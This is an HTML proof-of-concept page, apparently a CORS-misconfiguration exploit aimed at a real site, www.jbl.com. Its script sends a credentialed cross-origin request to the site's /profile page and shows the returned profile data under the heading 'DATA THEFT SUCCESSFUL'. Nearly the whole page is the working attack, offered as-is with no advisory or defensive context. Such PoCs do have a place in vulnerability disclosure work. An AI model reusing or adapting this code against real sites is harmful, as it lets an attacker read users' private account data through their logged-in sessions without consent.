<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>JBL CORS PoC - Real Data Theft</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .success { color: green; font-weight: bold; }
        .error { color: red; font-weight: bold; }
        pre { background: #f5f5f5; padding: 15px; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h1>🚨 JBL CORS Data Theft</h1>
    <p>This page reads your <strong>profile data</strong> from <code>www.jbl.com</code> using your session.</p>
    <button onclick="stealData()">Steal My Profile Data</button>
    <pre id="result"></pre>

    <script>
        async function stealData() {
            const resultEl = document.getElementById('result');
            try {
                const response = await fetch('https://www.jbl.com/profile', {
                    credentials: 'include',
                    mode: 'cors'
                });
                const text = await response.text();
                resultEl.innerHTML = `<span class="success">✅ DATA THEFT SUCCESSFUL!</span>
<p><strong>Stolen data length:</strong> ${text.length} characters</p>
<p><strong>Stolen content preview:</strong></p>
<pre>${text.substring(0, 1500)}</pre>`;
            } catch (err) {
                resultEl.innerHTML = `<span class="error">❌ Error: ${err.message}</span>`;
            }
        }
    </script>
</body>
</html>
